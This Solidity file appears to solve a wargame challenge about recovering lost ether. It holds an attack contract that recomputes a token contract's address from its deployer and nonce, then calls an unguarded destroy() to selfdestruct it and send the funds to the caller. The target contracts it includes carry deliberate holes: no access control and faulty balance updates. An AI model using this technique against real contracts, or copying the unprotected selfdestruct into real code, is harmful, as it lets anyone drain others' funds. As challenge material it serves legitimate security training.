// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    SimpleToken IToken;

    function attack(address _address) external {
        // nonce0= address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80))))));
        address nonce1 = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            _address,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        getFUnd(nonce1);
    }

    function getFUnd(address _Token) internal {
        IToken = SimpleToken(payable(_Token));
        IToken.destroy(payable(tx.origin));
    }
}

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    //0x312e34B43F4A2BD53CDDD63a3e95448951756D61
    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
